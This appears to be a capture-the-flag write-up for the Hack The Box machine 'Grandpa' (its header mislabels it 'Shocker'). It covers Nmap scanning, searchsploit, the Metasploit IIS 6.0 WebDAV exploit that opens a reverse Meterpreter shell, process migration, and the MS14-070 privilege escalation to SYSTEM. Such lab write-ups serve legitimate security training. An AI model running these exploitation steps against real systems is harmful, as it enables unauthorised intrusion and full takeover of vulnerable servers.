---
description: Walkthrough of the HTB machine "Shocker"
---

# 🧓 Grandpa (10.10.10.14)

## Scanning

Let's start with the usual Nmap scan:

```bash
nmap -T5 -A 10.10.10.14

Starting Nmap 7.92 ( https://nmap.org ) at 2024-03-08 12:57 UTC
Nmap scan report for 10.10.10.14
Host is up (0.15s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Fri, 08 Mar 2024 12:58:02 GMT
|_  Server Type: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows Server 2003 SP1 or SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows Server 2008 Enterprise SP2 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   148.37 ms 10.10.14.1
2   148.68 ms 10.10.10.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.38 seconds
```



## Enumeration

When performing a Pentest, a CTF, or any kind of ethical hacking-related activities, we should always first check the version of the service running on the target and search for exploits linked to said version.

In this case, we can see that Port 80 is running Microsoft IIS v6.0, so let's check for any exploits related to this.

```bash
searchsploit iis 6.0
```

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption><p>Multiple options of exploits for Microsoft IIS 6.0</p></figcaption></figure>

## Exploitation

We can use Metasploit to search for any modules that are capable of giving us a shell on the target:

```bash
msf6 > search iis 6.0

msf6 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl

msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set rhosts 10.10.10.14

msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set lhost tun0

msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run
```

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption><p>We have access to the machine</p></figcaption></figure>

## Post-Exploitation / Privilege Escalation

Now, since we have a "_meterpreter_" session, we can background this session and try to look for post-exploitation modules available for Windows in Metasploit.

We can use the following module to provide Exploit Suggestions:

```bash
msf6 > use post(multi/recon/local_exploit_suggester)

msf6 post(multi/recon/local_exploit_suggester) > set session <session number>

msf6 post(multi/recon/local_exploit_suggester) > run
```

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption><p>Exploit Suggestions</p></figcaption></figure>

Before we use any exploits, let's switch to a process running under "NT AUTHORITY\NETWORK SERVICE". To do this, let's first list the processes running:

```bash
meterpreter > ps
```

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption><p>Processes running under NT AUTHORITY\NETWORK SERVICE</p></figcaption></figure>

Now, let's simply migrate from one process to another using meterpreter:

```bash
meterpreter > migrate 2352
```

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption><p>Process Migration</p></figcaption></figure>

Now we run one of the exploits suggested as we saw earlier:

```bash
meterpreter > background

msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > run
```

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption><p>We have system</p></figcaption></figure>

Now we're "system" and we have fully rooted this machine.

### User Flag

The user flag is located in the following Directory:

```powershell
C:\Documents and Settings\Harry\Desktop
```

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption><p>User Flag</p></figcaption></figure>

### Root Flag

The root flag is located in the following Directory:

```powershell
C:\Documents and Settings\Administrator\Desktop
```

<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption><p>Root Flag</p></figcaption></figure>

And this was the CTF!&#x20;

Thank you so much for taking the time to read my WriteUp!

See you in another box!
